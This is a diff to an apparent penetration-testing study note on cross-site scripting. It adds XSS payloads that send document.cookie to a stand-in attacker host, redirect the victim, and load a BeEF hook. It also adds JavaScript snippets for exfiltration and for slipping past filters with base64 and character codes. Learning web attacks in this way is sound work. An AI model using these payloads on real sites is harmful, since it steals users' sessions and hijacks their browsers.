@@ -16,6 +16,9 @@ tags:
 > | Cookie steal | `<script>document.location='http://<LHOST>/?c='+document.cookie</script>` |
 > | Attribute inject | `" onmouseover="alert(1)` |
 > | Filter bypass | `<ScRiPt>alert(1)</ScRiPt>` |
+> | Cookie steal (fetch) | `<script>fetch('http://<LHOST>/?c='+document.cookie)</script>` |
+> | Redirect victim | `<script>window.location='http://<LHOST>'</script>` |
+> | BeEF hook | `<script src="http://<LHOST>:3000/hook.js"></script>` |
 
 ## Decision Tree
 
@@ -47,6 +50,8 @@ User input reflected in page?
 > - "ReferenceError: x is not defined" → JavaScript is case-sensitive; `multiplyValues` and `multiplyvalues` are different names.
 > - Console looks cluttered with library errors → open `about:blank` first so no site scripts load, then open the Web Console.
 > - When you reuse these concepts in a payload, remember raw `<script>` shown as text means the output was HTML-encoded. See [[🔣 Encoding Reference]].
+> - `Uncaught SyntaxError: Unexpected token` when pasting a payload → your outer and inner quote characters clash (e.g. a double-quoted attribute payload containing another double-quoted string). Mix single and double quotes, or use backticks for template literals, to avoid breaking out early.
+> - `Uncaught ReferenceError: fetch is not defined` in very old browsers/contexts → fall back to `XMLHttpRequest`, which has wider support.
 > Full list: [[⚠️ Common Errors & Troubleshooting]]
 
 > [!tip] Beginner note
@@ -87,6 +92,17 @@ Once the blank page is loaded, we'll click on the Web Console from the Web Devel
 
 > [!info] Testing in the browser console
 > Open the Firefox Web Console on `about:blank`, paste the function, and call it (e.g. `multiplyValues(3, 5)`). The console prints `15`, confirming your JavaScript ran.
+
+> [!example] The JS building blocks every XSS payload reuses
+> These are the handful of JavaScript features that show up in almost every XSS payload in this section — worth testing in the console before you rely on them in a payload:
+> ```javascript
+> document.cookie                              // read the page's cookies (empty/fails if all are HttpOnly)
+> fetch('http://<LHOST>/?c=' + document.cookie) // exfiltrate data to a listener (fire-and-forget)
+> new XMLHttpRequest()                          // older alternative to fetch(), used when you need synchronous requests
+> btoa(document.cookie)                         // base64-encode a value before sending it (dodges some naive filters)
+> String.fromCharCode(97, 98, 99)               // rebuild a string from character codes — used to smuggle payloads past bad-character filters
+> window.location = 'http://<LHOST>'            // redirect the victim's browser
+> ```
 
 ---
 %% graph-links %%
